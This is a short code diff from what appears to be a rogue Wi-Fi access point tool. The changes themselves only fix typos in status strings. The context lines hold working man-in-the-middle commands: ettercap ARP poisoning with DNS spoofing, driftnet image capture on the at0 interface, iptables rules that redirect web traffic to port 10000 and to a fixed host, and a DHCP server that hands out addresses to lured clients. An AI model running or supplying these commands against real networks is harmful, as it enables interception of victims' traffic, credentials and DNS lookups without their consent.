@@ -173,7 +173,7 @@ class frm_main(QWidget):
     def start_dns(self):
         system("sudo xterm -geometry 73x25-1+250 -T ettercap DNS Spoof-s -sb -si +sk -sl 5000 -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & ettercapid=$!")
     def start_dift(self):
-        system("sudo xterm -geometry 75x15+1+200 -T DriftNet Startup -e driftnet -i at0 & driftnetid=$!")
+        system("sudo xterm -geometry 75x15+1+200 -T DriftNet Started -e driftnet -i at0 & driftnetid=$!")
     def configure(self):
         self.listbox.addItem("{+} Setting dhcpd Server...")
         self.configuradhcp = open("Config/dhcpd.conf","w")
@@ -214,7 +214,7 @@ iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 iptables --table nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.101
 iptables -t nat -A POSTROUTING -j MASQUERADE
-echo "[+] Statup DHCP..."
+echo "[+] Startup DHCP..."
 touch /var/run/dhcpd.pid
 sudo  dhcpd -d -f -cf \"/etc/dhcp/dhcpd.conf\" at0
 sleep 3
